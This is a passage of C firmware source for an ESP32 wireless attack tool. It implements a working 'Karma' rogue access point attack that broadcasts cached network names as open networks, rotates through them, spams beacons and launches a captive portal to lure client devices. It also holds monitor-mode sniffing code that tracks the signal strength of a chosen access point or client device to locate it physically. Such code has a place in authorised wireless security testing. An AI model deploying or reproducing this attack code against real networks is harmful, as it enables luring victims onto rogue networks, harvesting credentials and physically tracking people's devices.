                .ssid_len = strlen(karma_ssid_cache[0]),
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 4,
                .ssid_hidden = 0
            }
        };
        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
        err = esp_wifi_set_mode(WIFI_MODE_AP);
        if (err != ESP_OK) printf("Karma: set_mode failed: %s\n", esp_err_to_name(err));
        err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
        if (err != ESP_OK) printf("Karma: set_config failed: %s\n", esp_err_to_name(err));
        err = esp_wifi_start();
        if (err != ESP_OK) printf("Karma: start failed: %s\n", esp_err_to_name(err));
        printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
        TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
        karma_start_portal_for_ssid(karma_ssid_cache[0]);
    }

    while (karma_running) {
        printf("Karma: loop start, ssid_count=%d, ap_sta_has_ip=%d\n", karma_ssid_count, ap_sta_has_ip);
        uint32_t now = esp_timer_get_time() / 1000;
        // Only rotate if more than one SSID
        if (!ap_sta_has_ip && karma_ssid_count > 1 && (now - last_ssid_change_time > 5000)) {
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = strlen(karma_ssid_cache[karma_ssid_index]),
                    .channel = 1,
                    .authmode = WIFI_AUTH_OPEN,
                    .max_connection = 4,
                    .ssid_hidden = 0
                }
            };
            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
            err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
            if (err != ESP_OK) printf("Karma: set_config failed: %s\n", esp_err_to_name(err));
            printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
            TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
            karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
            last_ssid_change_time = now;
        }
     
        // Send beacon frames for all cached SSIDs (every 500ms)
        if (!ap_sta_has_ip) {
            for (int i = 0; i < karma_ssid_count; ++i) {
                beacon_spam_broadcast_karma(karma_ssid_cache[i]);
                vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between beacons
            }
        }
     
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    esp_wifi_set_promiscuous(false);
    karma_stop_portal_if_active();
    karma_task_handle = NULL;
    printf("Karma attack stopped\n");
    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
    vTaskDelete(NULL);
}
void wifi_manager_start_karma(void) {
    if (karma_running) {
        printf("Karma attack already running\n");
        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
        return;
    }
    if (!karma_ssid_manual_mode) {
        karma_ssid_count = 0;
        karma_ssid_index = 0;
    }
    karma_running = true;
    BaseType_t rc = xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
    if (rc != pdPASS) {
        printf("Failed to start Karma task (%ld)\n", (long)rc);
        TERMINAL_VIEW_ADD_TEXT("Failed to start Karma task\n");
        karma_running = false;
        karma_task_handle = NULL;
        return;
    }
}

void wifi_manager_stop_karma(void) {
    if (!karma_running) {
        printf("Karma attack not running\n");
        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
        return;
    }
    karma_running = false;
    karma_ssid_count = 0;
    free(karma_ssid_cache);
    karma_ssid_cache = NULL;
    karma_ssid_index = 0;
    karma_ssid_manual_mode = false;
    strncpy(karma_portal_file, "default", sizeof(karma_portal_file));
    int wait_count = 0;
    while (karma_task_handle != NULL && wait_count < 30) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }

    if (karma_task_handle != NULL) {
        vTaskDelete(karma_task_handle);
        karma_task_handle = NULL;
    }
    printf("Karma attack stopped\n");
    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
}

bool wifi_manager_karma_is_running(void) {
    return karma_running;
}

// rssi tracking for selected ap and sta
static volatile bool ap_tracking_active = false;
static volatile bool sta_tracking_active = false;
static int8_t tracking_last_rssi = 0;
static int8_t tracking_min_rssi = 0;
static int8_t tracking_max_rssi = -127;
static rssi_median_t tracking_med = {0};
static int64_t tracking_last_rx_us = 0; // timestamp of last matched packet (signal freshness)

// 802.11 Frame Control is little-endian on ESP32: bits 2-3 = type,
// bits 4-7 = subtype. Beacons are MGMT (type 0) subtype 8.
#define WIFI_FC_TYPE_SUBTYPE_MASK 0x00FC
#define WIFI_FC_BEACON            0x0080

/* Closeness of the smoothed reading within this session's observed
 * [min, max] range, 0-100. More meaningful than absolute dBm when comparing
 * devices with different transmit powers. */
int wifi_manager_get_track_closeness(void) {
    if (!ap_tracking_active && !sta_tracking_active) return -1;
    if (tracking_max_rssi <= tracking_min_rssi) return -1;
    int pct = (tracking_last_rssi - tracking_min_rssi) * 100 /
              (tracking_max_rssi - tracking_min_rssi);
    if (pct < 0) pct = 0;
    if (pct > 100) pct = 100;
    return pct;
}

static void wifi_track_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    bool is_mgmt = (type == WIFI_PKT_MGMT);

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    wifi_ieee80211_mac_hdr_t hdr_copy;
    memcpy(&hdr_copy, &ipkt->hdr, sizeof(hdr_copy));
    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;

    int8_t rssi = pkt->rx_ctrl.rssi;
    bool match = false;

    if (ap_tracking_active && strlen((const char *)selected_ap.ssid) > 0) {
        // APs: beacons only (periodic, consistent rate/power). Probe
        // responses and other MGMT at varying rates would add jitter.
        // addr2 carries the BSSID on beacons.
        if (is_mgmt && (hdr->frame_ctrl & WIFI_FC_TYPE_SUBTYPE_MASK) == WIFI_FC_BEACON &&
            memcmp(hdr->addr2, selected_ap.bssid, 6) == 0) {
            match = true;
        }
    }

    if (sta_tracking_active && station_selected) {
        // Stations: MGMT + data (data frames are far denser when the client
        // is active). addr2 is the transmitter in both cases for STA->AP.
        if (memcmp(hdr->addr2, selected_station.station_mac, 6) == 0) {
            match = true;
        }
    }

    if (!match) return;

    if (rssi > tracking_max_rssi) tracking_max_rssi = rssi;
    if (rssi < tracking_min_rssi) tracking_min_rssi = rssi;

    rssi_median_push(&tracking_med, rssi);
    int8_t med = rssi_median_get(&tracking_med);
    int8_t delta = med - tracking_last_rssi;
    tracking_last_rssi = med;

    const char *direction = "";
    if (delta > 5) direction = " ↑ CLOSER";
    else if (delta < -5) direction = " ↓ FARTHER";

    int bars = 0;
    if (med > -50) bars = 5;
    else if (med > -60) bars = 4;
    else if (med > -70) bars = 3;
    else if (med > -80) bars = 2;
    else if (med > -90) bars = 1;

    char bar_str[8] = "";
    for (int i = 0; i < bars; i++) {
        strcat(bar_str, "#");
    }

    int close_pct = wifi_manager_get_track_closeness();
    if (close_pct >= 0) {
        glog("%s %d dBm (min:%d max:%d close:%d%%)%s\n", bar_str, med,
             tracking_min_rssi, tracking_max_rssi, close_pct, direction);
    } else {
        glog("%s %d dBm (min:%d max:%d)%s\n", bar_str, med,
             tracking_min_rssi, tracking_max_rssi, direction);
    }
    tracking_last_rx_us = esp_timer_get_time();
}

bool wifi_manager_get_track_status(int8_t *out_rssi, bool *out_fresh) {
    if (!ap_tracking_active && !sta_tracking_active) {
        return false;
    }
    if (out_rssi) {
        *out_rssi = tracking_last_rssi;
    }
    if (out_fresh) {
        int64_t now = esp_timer_get_time();
        // Consider the reading "live" if a matching packet arrived recently.
        *out_fresh = (tracking_last_rx_us != 0) && ((now - tracking_last_rx_us) < 1500000);
    }
    return true;
}

void wifi_manager_track_ap(void) {
    if (strlen((const char *)selected_ap.ssid) == 0) {
        glog("no ap selected. use 'select -a <index>' first.\n");
        return;
    }
    
    char sanitized_ssid[33];
    sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
    
    glog("=== tracking ap: %s ===\n", sanitized_ssid);
    glog("bssid: %02x:%02x:%02x:%02x:%02x:%02x\n",
         selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
         selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
    glog("channel: %d\n", selected_ap.primary);
    glog("move closer to increase signal. type 'stop' to end.\n\n");
    
    tracking_last_rssi = selected_ap.rssi;
    tracking_min_rssi = selected_ap.rssi;
    tracking_max_rssi = selected_ap.rssi;
    rssi_median_reset(&tracking_med);
    tracking_last_rx_us = esp_timer_get_time();
    ap_tracking_active = true;
    sta_tracking_active = false;
    
    // set channel to ap's channel
    esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
    
    status_display_show_status("Track AP");
    wifi_manager_start_monitor_mode(wifi_track_callback);
}

void wifi_manager_track_sta(void) {
    if (!station_selected) {
        glog("no station selected. use 'select -s <index>' first.\n");
        return;
    }
    
    glog("=== tracking sta ===\n");
    glog("station: %02x:%02x:%02x:%02x:%02x:%02x\n",
         selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
         selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5]);
    glog("ap: %02x:%02x:%02x:%02x:%02x:%02x\n",
         selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
         selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    glog("move closer to increase signal. type 'stop' to end.\n\n");
    
    // find the channel for this station's ap
    int channel = 1;
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
            channel = scanned_aps[i].primary;
            break;
        }
    }
    
    tracking_last_rssi = -100;
    tracking_min_rssi = -100;
    tracking_max_rssi = -127;
    rssi_median_reset(&tracking_med);
    tracking_last_rx_us = 0; // no station packet seen yet
    ap_tracking_active = false;
    sta_tracking_active = true;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    status_display_show_status("Track STA");
    wifi_manager_start_monitor_mode(wifi_track_callback);
}

void wifi_manager_stop_tracking(void) {
    if (ap_tracking_active || sta_tracking_active) {
        ap_tracking_active = false;
        sta_tracking_active = false;
        wifi_manager_stop_monitor_mode();
        glog("tracking stopped.\n");
        status_display_show_status("Track Stopped");
    }
}
